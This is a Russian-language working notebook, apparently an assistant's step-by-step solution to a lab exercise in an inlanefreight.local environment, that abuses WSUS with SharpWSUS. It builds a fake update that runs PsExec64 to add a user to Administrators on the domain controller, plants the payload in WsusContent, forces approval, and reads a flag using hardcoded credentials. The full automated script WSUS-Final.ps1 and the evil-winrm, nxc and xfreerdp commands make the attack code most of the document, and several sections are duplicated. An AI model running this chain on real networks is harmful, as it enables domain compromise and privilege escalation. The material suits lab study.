Если увидишь Active — отлично, идём ждать установку. Если снова Pending — пришли вывод, я подскажу, как это поправить (там есть нюанс именно с первым одобрением).

Заодно, чтобы понимать картину, добавь это:

***************

$cs = "Data Source=\\.\pipe\MICROSOFT##WID\tsql\query;Integrated Security=True;Initial Catalog=SUSDB;Connect Timeout=10"
$conn = New-Object System.Data.SqlClient.SqlConnection $cs; $conn.Open()
$c = $conn.CreateCommand()
$c.CommandText = "SELECT d.DeploymentID, d.ActionID, d.Deadline, d.DeploymentStatus, d.GoLiveTime, d.TargetGroupID FROM tbDeployment d WHERE d.RevisionID IN (SELECT RevisionID FROM tbRevision WHERE LocalUpdateID=(SELECT LocalUpdateID FROM tbUpdate WHERE UpdateID='$id'))"
$t = New-Object System.Data.DataTable; $t.Load($c.ExecuteReader()); $t | Format-Table -Auto
$conn.Close()

*****************

что ожидаем ----->>>>>

ActionID = 0 — это Install. DeploymentStatus = 1 — активна.

Шаг 6. Ждать и проверять статус
DC01 обращается к WSUS примерно раз в 60 минут (в этой лабе цикл детекта ~1 час). От одобрения до установки — до ~1 часа, обычно 30–65 минут.

Проверяй так (можно повторять каждые 2–3 минуты):


cd C:\Tools
.\SharpWSUS.exe check /updateid:$id /computername:dc01.inlanefreight.local 2>&1 | Select-String "Update"

******************************




Более надёжный контроль — напрямую по базе WSUS:

powershell
Copy

*****************************
$cs = "Data Source=\\.\pipe\MICROSOFT##WID\tsql\query;Integrated Security=True;Initial Catalog=SUSDB;Connect Timeout=10"
$conn = New-Object System.Data.SqlClient.SqlConnection $cs; $conn.Open()
$c = $conn.CreateCommand()
$c.CommandText = "SELECT s.SummarizationState, s.LastChangeTime FROM tbUpdateStatusPerComputer s JOIN tbUpdate u ON u.LocalUpdateID=s.LocalUpdateID WHERE u.UpdateID='$id'"
$t = New-Object System.Data.DataTable; $t.Load($c.ExecuteReader()); $t | Format-Table -Auto
$c2 = $conn.CreateCommand()
$c2.CommandText = "SELECT LastReportedStatusTime FROM tbComputerTarget WHERE FullDomainName LIKE 'dc01%'"
$t2 = New-Object System.Data.DataTable; $t2.Load($c2.ExecuteReader()); "DC01 last report: " + $t2.Rows[0][0]
$conn.Close()

**************************
что ожидаем ----->>>>>
Коды SummarizationState:

Код	Значение
нет строки	DC01 ещё не видел обновление
2	NotInstalled — видит, но не поставил
3	Downloaded — скачал
4	Installed — готово
5	Failed



Шаг 6 (продолжение). Запусти цикл ожидания — он сам всё покажет

***************************

$names = @{0="Unknown";1="NotApplicable";2="NotInstalled";3="Downloaded";4="Installed";5="Failed";6="PendingReboot"}
$cs = "Data Source=\\.\pipe\MICROSOFT##WID\tsql\query;Integrated Security=True;Initial Catalog=SUSDB"
for ($i = 1; $i -le 100; $i++) {

    cmd /c "net use \\172.20.0.10\IPC$ /delete" 2>$null | Out-Null
    cmd /c "net use \\172.20.0.10\C$ /delete"   2>$null | Out-Null
    cmd /c "net use \\172.20.0.10\C$ /user:INLANEFREIGHT\filiplain Password1" 2>$null | Out-Null

    if (Test-Path "\\172.20.0.10\C$\WSUS\flag.txt") {
        Write-Host "ГОТОВО - флаг доступен" -ForegroundColor Green
        Get-Content "\\172.20.0.10\C$\WSUS\flag.txt"
        break
    }

    $conn = New-Object System.Data.SqlClient.SqlConnection $cs; $conn.Open()
    $c = $conn.CreateCommand()
    $c.CommandText = "SELECT TOP 1 s.SummarizationState FROM tbUpdateStatusPerComputer s JOIN tbUpdate u ON u.LocalUpdateID=s.LocalUpdateID WHERE u.UpdateID='$id'"
    $st = $c.ExecuteScalar(); $conn.Close()
    if ($null -eq $st) { $txt = "нет данных (DC01 ещё не видел)" } else { $txt = "state=$st ($($names[[int]$st]))" }
    "[$(Get-Date -Format HH:mm:ss)] $txt | флаг пока недоступен"

    Start-Sleep -Seconds 45
}
*******************************
что ожидаем ----->>>>>
[14:12:03] нет данных (DC01 ещё не видел)
[14:12:48] нет данных (DC01 ещё не видел)
[14:21:15] state=2 (NotInstalled)      <- DC01 увидел
[14:36:40] state=4 (Installed)         <- установлено, выходим


net use \\172.20.0.10\C$ /user:INLANEFREIGHT\filiplain Password1
Get-Content \\172.20.0.10\C$\WSUS\flag.txt
Get-Content \\172.20.0.10\C$\WSUS\flag.txt

!!!!!!!!!!!!!!!!!!!!
Pending — это не ошибка, а промежуточное состояние: WSUS активирует новое одобрение асинхронно (особенно первое для обновления — ему надо подготовить XML и разложить bundle). В нашем случае оно само стало Active через ~45 секунд.

Но если зависнет — вот что делать, по порядку.

1. Подождать и перепроверить (в 90% случаев хватает)
powershell
Copy
Start-Sleep 90
$u = $wsus.GetUpdate([guid]$id)
$u.GetUpdateApprovals() | Format-Table Action, State, Deadline, GoLiveTime -Auto
2. Повторить одобрение (идемпотентно, ничего не ломает)
Иногда второй вызов «дотолкивает» деплоймент в Active:

powershell
Copy
$g = $wsus.GetComputerTargetGroups() | Where-Object { $_.Name -eq "FastUpdates" }
$u.Approve("Install", $g, (Get-Date).AddMinutes(-1)) | Out-Null
Start-Sleep 30
$u.GetUpdateApprovals() | Format-Table Action, State, Deadline, GoLiveTime -Auto
3. Проверить причину — время вступления в силу (GoLiveTime)
powershell
Copy
$cs = "Data Source=\\.\pipe\MICROSOFT##WID\tsql\query;Integrated Security=True;Initial Catalog=SUSDB;Connect Timeout=10"
$conn = New-Object System.Data.SqlClient.SqlConnection $cs; $conn.Open()
$c = $conn.CreateCommand()
$c.CommandText = "SELECT DeploymentID, ActionID, Deadline, DeploymentStatus, GoLiveTime FROM tbDeployment d WHERE d.RevisionID IN (SELECT RevisionID FROM tbRevision WHERE LocalUpdateID=(SELECT LocalUpdateID FROM tbUpdate WHERE UpdateID='$id'))"
$t = New-Object System.Data.DataTable; $t.Load($c.ExecuteReader()); $t | Format-Table -Auto
"СЕЙЧАС = " + (Get-Date)
$conn.Close()
Смотри на строку с ActionID = 0:

Что видишь	Причина	Что делать
GoLiveTime в будущем	одобрение «вступает в силу» позже — до этого момента оно Pending	одобрить заново (пункт 2) — GoLiveTime станет текущим временем
GoLiveTime в прошлом, но State Pending	WSUS не переварил деплоймент	пункт 4
DeploymentStatus = 0	деплоймент неактивен	одобрить заново (пункт 2)
4. Перезапустить службу WSUS (крайняя мера, помогает если деплоймент «залип»)
powershell
Copy
Restart-Service WsusService -Force
Start-Sleep 15
Get-Service WsusService | Select-Object Name, Status
После этого подожди минуту и снова проверь approvals (пункт 1).

5. Обходной путь — одобрить БЕЗ дедлайна
Дедлайн нужен только для того, чтобы клиент не ждал своего расписания. Если с ним проблемы, можно одобрить обычным способом — установка пройдёт на ближайшем цикле по расписанию:

powershell
Copy
$u.Approve("Install", $g) | Out-Null      # без третьего аргумента
Start-Sleep 30
$u.GetUpdateApprovals() | Format-Table Action, State, Deadline -Auto
Тут Deadline будет 12/31/9999 — это нормально, просто ждать придётся не 5–20 минут, а до следующего окна установки.

Важно, что реально влияет на установку:

Условие	Проверка
одобрение Active	GetUpdateApprovals()
DC01 в группе одобрения	$c.GetComputerTargetGroups()
контент отдаётся	HTTP 200 по обоим путям
нет ошибок загрузки	GetFailedToDownloadUpdatesCount() = 0
клиент синкается	LastReportedStatusTime обновляется
Если все пять пунктов выполнены, а SummarizationState держится на 2 больше 30 минут — тогда проблема на стороне клиента (его политика автообновлений), и это уже лечится на самом DC01, а не на WSUS.

## !!!!!!!!!!!!!вариант 2!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Вариант Б. По шагам руками

Всё на WSUS, PowerShell от администратора. Внутренние адреса не меняются: WSUS 172.20.0.30, DC01 172.20.0.10.

1. Проверка

       hostname
       whoami
        Get-ChildItem "C:\Tools\SharpWSUS.exe","C:\Tools\sysinternals\PsExec64.exe" -ErrorAction SilentlyContinue | Select-Object FullName,Length
        Test-Path C:\WSUS\WsusContent

3. Создать обновление


cd C:\Tools
        
        $out = .\SharpWSUS.exe create /payload:"C:\Tools\sysinternals\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" /title:"NewAccountUpdate"
        $id = [regex]::Match(($out -join "`n"), 'updateid:([0-9a-fA-F-]{36})').Groups[1].Value
        "UPDATE ID = $id"

4. Контент (правило: последние 2 символа SHA1 \ полный SHA1.exe)


        $h = (Get-FileHash "C:\Tools\sysinternals\PsExec64.exe" -Algorithm SHA1).Hash
        "payload SHA1 = $h"
        $dest = "C:\WSUS\WsusContent\" + $h.Substring($h.Length-2) + "\" + $h + ".exe"
        "основной путь: $dest"
        New-Item -ItemType Directory -Force (Split-Path $dest) | Out-Null
        Copy-Item "C:\Tools\sysinternals\PsExec64.exe" $dest -Force
        Copy-Item "C:\Tools\sysinternals\PsExec64.exe" "C:\WSUS\WsusContent\wuagent.exe" -Force
        "доп. путь:     C:\WSUS\WsusContent\wuagent.exe"
        $rel = $dest.Substring("C:\WSUS\WsusContent\".Length) -replace '\\','/'
        "HTTP основной  = " + (Invoke-WebRequest "http://wsus.inlanefreight.local:8530/Content/$rel" -UseBasicParsing).StatusCode
        "HTTP wuagent   = " + (Invoke-WebRequest "http://wsus.inlanefreight.local:8530/Content/wuagent.exe" -UseBasicParsing).StatusCode


5. Проверить контент на WSUS

        [void][reflection.assembly]::LoadWithPartialName("Microsoft.UpdateServices.Administration")
        $wsus = [Microsoft.UpdateServices.Administration.AdminProxy]::GetUpdateServer("WSUS",$false,8530)
        $wsus.ResetAndVerifyContentState()
        $wsus.ResumeAllDownloads()
        "failed downloads = " + $wsus.GetFailedToDownloadUpdatesCount()


6. Группа + DC01 + одобрение (идемпотентно, без duplicate key)


        $groupName = "FastUpdates"
        $g = $wsus.GetComputerTargetGroups() | Where-Object { $_.Name -eq $groupName }
        if (-not $g) { $g = $wsus.CreateComputerTargetGroup($groupName); "группа СОЗДАНА" } else { "группа уже есть" }
        $c = $wsus.GetComputerTargetByName("dc01.inlanefreight.local")
        if (-not ($c.GetComputerTargetGroups() | Where-Object { $_.Id -eq $g.Id })) { $g.AddComputerTarget($c); "DC01 добавлен" } else { "DC01 уже в группе" }
        $u = $wsus.GetUpdate([guid]$id)
        $res = $u.Approve("Install", $g, (Get-Date).AddMinutes(-1))
        "APPROVED action=" + $res.Action + " deadline=" + $res.Deadline

6. Убедиться, что одобрение Active


        Start-Sleep 45
        $u.GetUpdateApprovals() | Format-Table Action, State, Deadline, GoLiveTime -Auto

7. Ждать флаг, а не статус (5–20 минут)
       
        for ($i = 1; $i -le 40; $i++) {
        cmd /c "net use \\172.20.0.10\IPC$ /delete" 2>$null | Out-Null
        cmd /c "net use \\172.20.0.10\C$ /delete"   2>$null | Out-Null
        cmd /c "net use \\172.20.0.10\C$ /user:INLANEFREIGHT\filiplain Password1" 2>$null | Out-Null
        if (Test-Path "\\172.20.0.10\C$\WSUS\flag.txt") { "ГОТОВО"; Get-Content "\\172.20.0.10\C$\WSUS\flag.txt"; break }
        "флаг пока недоступен  $(Get-Date -Format HH:mm:ss)"
        Start-Sleep -Seconds 60
    }
   
9. Читать флаг

    net use \\172.20.0.10\C$ /user:INLANEFREIGHT\filiplain Password1
    Get-Content \\172.20.0.10\C$\WSUS\flag.txt

10. Проверка результата (надёжная)

        cmd /c "dir \\172.20.0.10\C$\WSUS"
        Get-Content \\172.20.0.10\C$\WSUS\flag.txt
        Главное, что надо помнить
        Что	Правильно
        Путь контента	WsusContent\<последние 2 символа SHA1>\<полный SHA1>.exe
        Одобрение	только $u.Approve("Install", $g, (Get-Date).AddMinutes(-1)), не SharpWSUS approve повторно
        Доступ к флагу	только через net use с явными кредами (иначе double-hop → Access is denied)
        Индикатор успеха	читаемый флаг / Filiplain в админах DC01, а НЕ SharpWSUS check
        Время ожидания	5–20 минут (цикл клиента ~13–15 мин)
        Ответ: WSUS_Rights_Are_Powerful

        Если нужен новый IP — пришли его, и я смогу сам проверить состояние стенда (у меня 10.129.229.244 и 10.129.32.217 уже отвалились).

        Files changed

    WSUS-Final.ps1Вариант 


!!!!!!!!!!!!!Б. По шагам руками

Всё на WSUS, PowerShell от администратора. Внутренние адреса не меняются: WSUS 172.20.0.30, DC01 172.20.0.10.

1. Проверка
   
    powershell
    Copy
    hostname
    whoami
    Get-ChildItem "C:\Tools\SharpWSUS.exe","C:\Tools\sysinternals\PsExec64.exe" -ErrorAction SilentlyContinue | Select-Object FullName,Length
    Test-Path C:\WSUS\WsusContent

3. Создать обновление

    powershell
    Copy
    cd C:\Tools
    $out = .\SharpWSUS.exe create /payload:"C:\Tools\sysinternals\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" /title:"NewAccountUpdate"
   
    $id = [regex]::Match(($out -join "`n"), 'updateid:([0-9a-fA-F-]{36})').Groups[1].Value
    "UPDATE ID = $id"

5. Контент (правило: последние 2 символа SHA1 \ полный SHA1.exe)
powershell
Copy

    $h = (Get-FileHash "C:\Tools\sysinternals\PsExec64.exe" -Algorithm SHA1).Hash
    "payload SHA1 = $h"
    $dest = "C:\WSUS\WsusContent\" + $h.Substring($h.Length-2) + "\" + $h + ".exe"
    "основной путь: $dest"
    New-Item -ItemType Directory -Force (Split-Path $dest) | Out-Null
    Copy-Item "C:\Tools\sysinternals\PsExec64.exe" $dest -Force
    Copy-Item "C:\Tools\sysinternals\PsExec64.exe" "C:\WSUS\WsusContent\wuagent.exe" -Force
    "доп. путь:     C:\WSUS\WsusContent\wuagent.exe"
    $rel = $dest.Substring("C:\WSUS\WsusContent\".Length) -replace '\\','/'
    "HTTP основной  = " + (Invoke-WebRequest "http://wsus.inlanefreight.local:8530/Content/$rel" -UseBasicParsing).StatusCode
    "HTTP wuagent   = " + (Invoke-WebRequest "http://wsus.inlanefreight.local:8530/Content/wuagent.exe" -UseBasicParsing).StatusCode

6. Проверить контент на WSUS

    powershell
    Copy
    [void][reflection.assembly]::LoadWithPartialName("Microsoft.UpdateServices.Administration")
    $wsus = [Microsoft.UpdateServices.Administration.AdminProxy]::GetUpdateServer("WSUS",$false,8530)
    $wsus.ResetAndVerifyContentState()
    $wsus.ResumeAllDownloads()
    "failed downloads = " + $wsus.GetFailedToDownloadUpdatesCount()

7. Группа + DC01 + одобрение (идемпотентно, без duplicate key)
    powershell
    Copy
    $groupName = "FastUpdates"
    $g = $wsus.GetComputerTargetGroups() | Where-Object { $_.Name -eq $groupName }
    if (-not $g) { $g = $wsus.CreateComputerTargetGroup($groupName); "группа СОЗДАНА" } else { "группа уже есть" }
    $c = $wsus.GetComputerTargetByName("dc01.inlanefreight.local")
    if (-not ($c.GetComputerTargetGroups() | Where-Object { $_.Id -eq $g.Id })) { $g.AddComputerTarget($c); "DC01 добавлен" } else { "DC01 уже в группе" }
    $u = $wsus.GetUpdate([guid]$id)
    $res = $u.Approve("Install", $g, (Get-Date).AddMinutes(-1))
    "APPROVED action=" + $res.Action + " deadline=" + $res.Deadline

8. Убедиться, что одобрение Active
    powershell
    Copy
    Start-Sleep 45
    $u.GetUpdateApprovals() | Format-Table Action, State, Deadline, GoLiveTime -Auto

9. Ждать флаг, а не статус (5–20 минут)
    powershell
    Copy
   
for ($i = 1; $i -le 40; $i++) {
    cmd /c "net use \\172.20.0.10\IPC$ /delete" 2>$null | Out-Null
    cmd /c "net use \\172.20.0.10\C$ /delete"   2>$null | Out-Null
    cmd /c "net use \\172.20.0.10\C$ /user:INLANEFREIGHT\filiplain Password1" 2>$null | Out-Null
    if (Test-Path "\\172.20.0.10\C$\WSUS\flag.txt") { "ГОТОВО"; Get-Content "\\172.20.0.10\C$\WSUS\flag.txt"; break }
    "флаг пока недоступен  $(Get-Date -Format HH:mm:ss)"
    Start-Sleep -Seconds 60
}

11. Читать флаг
powershell
Copy
net use \\172.20.0.10\C$ /user:INLANEFREIGHT\filiplain Password1
Get-Content \\172.20.0.10\C$\WSUS\flag.txt

12. Проверка результата (надёжная)
powershell
Copy
cmd /c "dir \\172.20.0.10\C$\WSUS"
Get-Content \\172.20.0.10\C$\WSUS\flag.txt
Главное, что надо помнить
Что	Правильно
Путь контента	WsusContent\<последние 2 символа SHA1>\<полный SHA1>.exe
Одобрение	только $u.Approve("Install", $g, (Get-Date).AddMinutes(-1)), не SharpWSUS approve повторно
Доступ к флагу	только через net use с явными кредами (иначе double-hop → Access is denied)
Индикатор успеха	читаемый флаг / Filiplain в админах DC01, а НЕ SharpWSUS check
Время ожидания	5–20 минут (цикл клиента ~13–15 мин)
Ответ: WSUS_Rights_Are_Powerful

Если нужен новый IP — пришли его, и я смогу сам проверить состояние стенда (у меня 10.129.229.244 и 10.129.32.217 уже отвалились).






powershell -ExecutionPolicy Bypass -File C:\Tools\WSUS-Final.ps1
WSUS-Final.ps1
************************************************************
<#
    WSUS-Final.ps1  —  всё в одном, идемпотентно, можно запускать много раз.

    ГДЕ: на сервере WSUS (hostname = WSUS), PowerShell ОТ АДМИНИСТРАТОРА.
    ЗАПУСК: powershell -ExecutionPolicy Bypass -File C:\Tools\WSUS-Final.ps1

    ВАЖНО: успех определяется ПО ФЛАГУ, а не по `SharpWSUS.exe check`.
    SharpWSUS создаёт пару обновлений (payload + bundle); статус в SUSDB ведётся
    по bundle и может остаться "2 (NotInstalled)", хотя payload уже выполнился.
#>

$ErrorActionPreference = "Continue"
$ProgressPreference    = "SilentlyContinue"

# ---------------- настройки ----------------
$Target      = "dc01.inlanefreight.local"
$GroupName   = "FastUpdates"
$Title       = "NewAccountUpdate"
$Payload     = "C:\Tools\sysinternals\PsExec64.exe"
$PayloadArgs = '-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add'
$DcUser      = "INLANEFREIGHT\filiplain"
$DcPass      = "Password1"
$DcIp        = "172.20.0.10"
$FlagPath    = "\\$DcIp\C$\WSUS\flag.txt"
$WaitMinutes = 45

function Say($m){ Write-Host "[*] $m" }
function Ok($m) { Write-Host "[+] $m" -ForegroundColor Green }
function Bad($m){ Write-Host "[-] $m" -ForegroundColor Red }

# ---------------- 0. проверки ----------------
if ((hostname) -ne "WSUS") { Bad "Это не WSUS (hostname=$(hostname)). Запусти на сервере WSUS."; return }
if (-not (Test-Path $Payload)) { Bad "Не найден payload: $Payload"; return }
Ok "hostname=WSUS, payload найден"

[void][reflection.assembly]::LoadWithPartialName("Microsoft.UpdateServices.Administration")
$wsus = [Microsoft.UpdateServices.Administration.AdminProxy]::GetUpdateServer("WSUS",$false,8530)
Ok "WSUS API подключён"

# ---------------- 1. создаём обновление ----------------
Say "создаём обновление..."
$cmdline = 'C:\Tools\SharpWSUS.exe create /payload:"' + $Payload + '" /args:"' + $PayloadArgs + '" /title:"' + $Title + '"'
$out = cmd /c "$cmdline 2>&1"
$id  = [regex]::Match(($out -join "`n"), 'updateid:([0-9a-fA-F-]{36})').Groups[1].Value
if (-not $id) { Bad "create не вернул updateid:"; $out | Select-Object -Last 6; return }
$u = $wsus.GetUpdate([guid]$id)
Ok "update id = $id"

# ---------------- 2. контент ----------------
# правило WSUS: папка = ПОСЛЕДНИЕ 2 символа SHA1, имя = ПОЛНЫЙ SHA1 + .exe
$h    = (Get-FileHash $Payload -Algorithm SHA1).Hash
$dest = "C:\WSUS\WsusContent\" + $h.Substring($h.Length-2) + "\" + $h + ".exe"
foreach ($p in @($dest, "C:\WSUS\WsusContent\wuagent.exe")) {
    New-Item -ItemType Directory -Force (Split-Path $p) | Out-Null
    Copy-Item $Payload $p -Force
    $rel = $p.Substring("C:\WSUS\WsusContent\".Length) -replace '\\','/'
    try   { $code = (Invoke-WebRequest "http://wsus.inlanefreight.local:8530/Content/$rel" -UseBasicParsing -TimeoutSec 15).StatusCode }
    catch { $code = "ERR" }
    if ($code -eq 200) { Ok "контент $rel -> 200" } else { Bad "контент $rel -> $code" }
}
$wsus.ResetAndVerifyContentState()
$wsus.ResumeAllDownloads()
Say ("failed downloads = " + $wsus.GetFailedToDownloadUpdatesCount())

# ---------------- 3. группа + DC01 (идемпотентно) ----------------
$g = $wsus.GetComputerTargetGroups() | Where-Object { $_.Name -eq $GroupName }
if (-not $g) { $g = $wsus.CreateComputerTargetGroup($GroupName); Ok "группа '$GroupName' создана" }
else        { Say "группа '$GroupName' уже есть" }

$c = $wsus.GetComputerTargetByName($Target)
if (-not $c) { Bad "компьютер $Target не зарегистрирован в WSUS"; return }
if (-not ($c.GetComputerTargetGroups() | Where-Object { $_.Id -eq $g.Id })) {
    $g.AddComputerTarget($c); Ok "DC01 добавлен в '$GroupName'"
} else { Say "DC01 уже в '$GroupName' — добавление не нужно" }

# ---------------- 4. одобрение + дедлайн ----------------
$groups = @($g)
$all = $wsus.GetComputerTargetGroups() | Where-Object { $_.Name -eq "All Computers" }
if ($all) { $groups += $all }
foreach ($grp in $groups) {
    try { $u.Approve("Install", $grp, (Get-Date).AddMinutes(-1)) | Out-Null; Ok ("одобрено для группы: " + $grp.Name) }
    catch { Bad ("одобрить не удалось (" + $grp.Name + "): " + $_.Exception.Message) }
}

# ---------------- 5. ждём ФЛАГ, а не статус ----------------
Say "ждём выполнения payload на DC01 (до $WaitMinutes мин). Проверка — по флагу (статус SharpWSUS не показатель)."
$cs   = "Data Source=\\.\pipe\MICROSOFT##WID\tsql\query;Integrated Security=True;Initial Catalog=SUSDB;Connect Timeout=10"
$stop = (Get-Date).AddMinutes($WaitMinutes)
$flag = $null
while ((Get-Date) -lt $stop) {
    $st = $null
    try {
        $conn = New-Object System.Data.SqlClient.SqlConnection $cs; $conn.Open()
        $a = $conn.CreateCommand()
        $a.CommandText = "SELECT TOP 1 s.SummarizationState FROM tbUpdateStatusPerComputer s JOIN tbUpdate u ON u.LocalUpdateID=s.LocalUpdateID WHERE u.UpdateID='$id'"
        $st = $a.ExecuteScalar(); $conn.Close()
    } catch { }

    cmd /c "net use \\$DcIp\IPC$ /delete" 2>$null | Out-Null
    cmd /c "net use \\$DcIp\C$ /delete"   2>$null | Out-Null
    cmd /c "net use \\$DcIp\C$ /user:$DcUser $DcPass" 2>$null | Out-Null

    if (Test-Path $FlagPath) { $flag = (Get-Content $FlagPath -Raw).Trim(); break }

    Say ("state=$st | $(Get-Date -Format HH:mm:ss) | флаг пока недоступен")
    Start-Sleep -Seconds 60
}

# ---------------- 6. результат ----------------
Write-Host ""
if ($flag) {
    Ok "FLAG = $flag"
} else {
    Bad "Флаг не появился за $WaitMinutes минут."
    Bad "Проверь: (1) контент 200, (2) одобрение Active, (3) DC01 синкается — и запусти скрипт снова."
}
************************************************************



.\SharpWSUS.exe delete /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv02.inlanefreight.local


# WSUS через Invoke-SharpWSUS

Важно: функция перехватывает Console.Out и возвращает вывод строкой, а не печатает его сразу. Поэтому результат надо либо вывести, либо сохранить:

powershell
Copy
Invoke-SharpWSUS locate                       # в консоли ничего не увидишь
$out = Invoke-SharpWSUS locate; $out          # так — увидишь
Invoke-SharpWSUS locate | Out-String          # или так

Атака через него — полная последовательность
Всё на WSUS, PowerShell от администратора.

powershell
Copy
# --- 0. загрузить функцию ---
. C:\Tools\Invoke-SharpWSUS.ps1

# --- 1. создать обновление (payload: подписанный PsExec64 + наша команда) ---
$out = Invoke-SharpWSUS create /payload:"C:\Tools\sysinternals\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" /title:"NewAccountUpdate"
$out -join "`n"
$id = [regex]::Match(($out -join "`n"), 'updateid:([0-9a-fA-F-]{36})').Groups[1].Value
"UPDATE ID = $id"
powershell
Copy
# --- 2. положить payload в контент WSUS ---
$h = (Get-FileHash "C:\Tools\sysinternals\PsExec64.exe" -Algorithm SHA1).Hash
$dest = "C:\WSUS\WsusContent\" + $h.Substring($h.Length-2) + "\" + $h + ".exe"
New-Item -ItemType Directory -Force (Split-Path $dest) | Out-Null
Copy-Item "C:\Tools\sysinternals\PsExec64.exe" $dest -Force
Copy-Item "C:\Tools\sysinternals\PsExec64.exe" "C:\WSUS\WsusContent\wuagent.exe" -Force
$rel = $dest.Substring("C:\WSUS\WsusContent\".Length) -replace '\\','/'
"HTTP = " + (Invoke-WebRequest "http://wsus.inlanefreight.local:8530/Content/$rel" -UseBasicParsing).StatusCode
powershell
Copy
# --- 3. одобрить через Invoke-SharpWSUS ---
$out = Invoke-SharpWSUS approve /updateid:$id /computername:dc01.inlanefreight.local /groupname:"FastUpdates"
$out -join "`n"
powershell
Copy
# --- 4. дедлайн (обёртка его не умеет — только через API) ---
[void][reflection.assembly]::LoadWithPartialName("Microsoft.UpdateServices.Administration")
$wsus = [Microsoft.UpdateServices.Administration.AdminProxy]::GetUpdateServer("WSUS",$false,8530)
$wsus.ResetAndVerifyContentState(); $wsus.ResumeAllDownloads()
$g = $wsus.GetComputerTargetGroups() | Where-Object { $_.Name -eq "FastUpdates" }
$u = $wsus.GetUpdate([guid]$id)
$u.Approve("Install", $g, (Get-Date).AddMinutes(-1)) | Out-Null
$u.GetUpdateApprovals() | Format-Table Action, State, Deadline -Auto
powershell
Copy
# --- 5. забрать флаг (ждём до ~1 часа — цикл детекта клиента) ---
net use \\172.20.0.10\C$ /user:INLANEFREIGHT\filiplain Password1
Get-Content \\172.20.0.10\C$\WSUS\flag.txt
4. Чего обёртка НЕ делает
Задача	Почему	Чем делать
locate	читает клиентский реестровый ключ	запускать на SRV01, не на WSUS
Контент (WsusContent\02\…exe)	SharpWSUS этого не делает, WSUS ловит 404	вручную, путь из события 364 или по правилу last2\fullSHA1.exe
Дедлайн	SharpWSUS не умеет ставить срок установки	$u.Approve("Install", $g, (Get-Date).AddMinutes(-1))
5. Полезные мелочи
duplicate key — если группа уже создана и DC01 в ней, approve упадёт. Обходить: новое имя группы (/groupname:"FastUpdates2") или одобрять сразу через API.
Проверка статуса бесполезна — check и SummarizationState для этих обновлений врут (state остаётся 2 даже после успеха). Единственный честный признак — читаемый флаг / filiplain в админах DC01.
Ожидание — реальный цикл детекта клиента ~60 минут, поэтому цикл ожидания делай на 70–100 итераций.
Кстати, по текущему прогону: обновление eb0ab3de-b645-4edc-aed9-3862b71b8fec (через Invoke-SharpWSUS) создано и одобрено с дедлайном, слежение за маркером C:\Windows\Temp\invproof на DC01 работает в фоне. Как появится — сообщу.



# PSRemoting (WinRM)
Enable-PSRemoting -Force
## Выполнить команду Get-Service на сервере Server01
Invoke-Command -ComputerName Server01 -ScriptBlock { Get-Service }

## Или войти в интерактивную сессию
Enter-PSSession -ComputerName Server01 

Для определения нестандартных портов используйте команду netstat. Например, выполните команду: netstat -ano

tasklist /svc /FI "PID eq 336"

для ipv6

Enter-PSSession -ComputerName [dead:beef::647f:620f:3a1a:e978] -Authentication Negotiate

evil-winrm -i <IPv6_SRV01> -u filiplain -p 'Password1'
nxc winrm <IPv6_SRV01> -u filiplain -p 'Password1'
узнать ipv6
nxc smb 10.129.21.116 -u filiplain -p 'Password1' -x "ipconfig | findstr /i IPv6"ф

sudo ip -6 rule del priority 9000

xfreerdp /v:[dead:beef::178] /u:filiplain /p:'Password1' /d:inlanefreight.local /cert:ignore /dynamic-resolution

nxc winrm dead:beef::178 -u filiplain -p 'Password1' -x "whoami"
Enter-PSSession -ComputerName dead:beef::178 -Authentication Negotiate

